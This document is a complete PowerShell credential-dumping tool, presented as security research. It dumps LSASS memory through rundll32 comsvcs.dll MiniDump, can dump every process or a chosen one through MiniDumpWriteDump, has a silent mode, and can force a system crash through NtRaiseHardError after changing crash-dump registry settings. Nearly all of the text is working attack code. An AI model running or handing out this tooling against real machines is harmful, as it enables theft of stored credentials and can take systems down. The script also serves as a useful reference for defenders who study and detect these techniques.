# Memory Dumping Script for Security Research
# Requires Administrator privileges
# Usage: .\dump_memory.ps1 -Method <method> -Target <target> [-OutputPath <path>]

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("Process", "LSASS", "FullSystem", "Minidump", "AllProcesses")]
    [string]$Method,

    [Parameter(Mandatory=$false)]
    [string]$Target,

    [string]$OutputPath = "$env:TEMP\memory_dumps",

    [switch]$Silent
)

# Check for admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "This script requires Administrator privileges. Please run as Administrator."
    exit 1
}

# Create output directory
if (!(Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

function Write-Log {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host "[*] $Message" -ForegroundColor Cyan
    }
}

function Dump-ProcessWithComsvcs {
    param([int]$ProcessId, [string]$ProcessName)

    $dumpFile = "$OutputPath\${ProcessName}_${ProcessId}_$timestamp.dmp"
    Write-Log "Dumping process $ProcessName (PID: $ProcessId) using comsvcs.dll..."

    try {
        $null = rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $dumpFile full
        Start-Sleep -Seconds 2

        if (Test-Path $dumpFile) {
            Write-Log "Dump created successfully: $dumpFile"
            Get-Item $dumpFile | Select-Object Name, Length, LastWriteTime
            return $true
        } else {
            Write-Error "Dump file was not created"
            return $false
        }
    } catch {
        Write-Error "Failed to create dump: $_"
        return $false
    }
}

function Dump-ProcessWithPowerShell {
    param([int]$ProcessId, [string]$ProcessName)

    $dumpFile = "$OutputPath\${ProcessName}_${ProcessId}_$timestamp.dmp"
    Write-Log "Dumping process $ProcessName (PID: $ProcessId) using PowerShell..."

    try {
        # Load Windows API for memory dumping
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class MiniDump {
    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam);
}
"@

        $process = Get-Process -Id $ProcessId -ErrorAction Stop
        $fileStream = [System.IO.File]::Create($dumpFile)

        $result = [MiniDump]::MiniDumpWriteDump(
            $process.Handle,
            $process.Id,
            $fileStream.SafeFileHandle.DangerousGetHandle(),
            2, # MiniDumpWithFullMemory
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [IntPtr]::Zero
        )

        $fileStream.Close()

        if ($result) {
            Write-Log "Dump created successfully: $dumpFile"
            Get-Item $dumpFile | Select-Object Name, Length, LastWriteTime
            return $true
        } else {
            Write-Error "MiniDumpWriteDump failed"
            return $false
        }
    } catch {
        Write-Error "Failed to create dump: $_"
        if ($fileStream) { $fileStream.Close() }
        return $false
    }
}

function Dump-AllProcesses {
    Write-Log "Dumping all accessible processes..."
    $processes = Get-Process | Where-Object { $_.Id -ne $PID }
    $successCount = 0

    foreach ($proc in $processes) {
        try {
            Write-Log "Processing: $($proc.ProcessName) (PID: $($proc.Id))"
            $result = Dump-ProcessWithComsvcs -ProcessId $proc.Id -ProcessName $proc.ProcessName
            if ($result) { $successCount++ }
        } catch {
            Write-Host "[!] Failed to dump $($proc.ProcessName): $_" -ForegroundColor Yellow
        }
    }

    Write-Log "Successfully dumped $successCount processes"
}

function Dump-FullSystemMemory {
    Write-Log "Creating full system memory dump..."
    Write-Log "This will create a complete memory dump and may cause a system crash/reboot"

    # Configure system for full memory dump
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 1
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "DumpFile" -Value "$OutputPath\MEMORY_$timestamp.dmp"

    Write-Host "`n[!] WARNING: This will force a system crash and reboot!" -ForegroundColor Red
    Write-Host "[!] The memory dump will be available after reboot at: $OutputPath\MEMORY_$timestamp.dmp" -ForegroundColor Yellow
    Write-Host "[!] Press Ctrl+C to cancel, or any other key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

    # Force a crash dump (requires kernel debug mode)
    Write-Log "Forcing system crash dump..."
    $code = @"
using System;
using System.Runtime.InteropServices;

public class CrashDump {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
        IntPtr Parameters, uint ValidResponseOptions, out uint Response);
}
"@
    Add-Type -TypeDefinition $code

    $enabled = $false
    [CrashDump]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled) | Out-Null
    $response = 0
    [CrashDump]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response) | Out-Null
}

# Main execution
Write-Log "Memory Dumping Script Started"
Write-Log "Method: $Method"
Write-Log "Output Path: $OutputPath"

switch ($Method) {
    "Process" {
        if (-not $Target) {
            Write-Error "Target parameter required for Process method. Specify process name or PID."
            exit 1
        }

        # Try to parse as PID first
        $process = $null
        if ($Target -match '^\d+$') {
            $process = Get-Process -Id ([int]$Target) -ErrorAction SilentlyContinue
        } else {
            $process = Get-Process -Name $Target -ErrorAction SilentlyContinue | Select-Object -First 1
        }

        if (-not $process) {
            Write-Error "Process not found: $Target"
            exit 1
        }

        Write-Log "Target: $($process.ProcessName) (PID: $($process.Id))"
        Dump-ProcessWithComsvcs -ProcessId $process.Id -ProcessName $process.ProcessName
    }

    "LSASS" {
        Write-Log "Dumping LSASS process (for credential analysis)..."
        $lsass = Get-Process -Name "lsass" -ErrorAction SilentlyContinue

        if (-not $lsass) {
            Write-Error "LSASS process not found"
            exit 1
        }

        Write-Log "LSASS PID: $($lsass.Id)"
        Dump-ProcessWithComsvcs -ProcessId $lsass.Id -ProcessName "lsass"
    }

    "Minidump" {
        if (-not $Target) {
            Write-Error "Target parameter required for Minidump method. Specify process name or PID."
            exit 1
        }

        $process = $null
        if ($Target -match '^\d+$') {
            $process = Get-Process -Id ([int]$Target) -ErrorAction SilentlyContinue
        } else {
            $process = Get-Process -Name $Target -ErrorAction SilentlyContinue | Select-Object -First 1
        }

        if (-not $process) {
            Write-Error "Process not found: $Target"
            exit 1
        }

        Dump-ProcessWithPowerShell -ProcessId $process.Id -ProcessName $process.ProcessName
    }

    "AllProcesses" {
        Dump-AllProcesses
    }

    "FullSystem" {
        Dump-FullSystemMemory
    }
}

Write-Log "Memory dumping operation completed"
Write-Log "Output directory: $OutputPath"
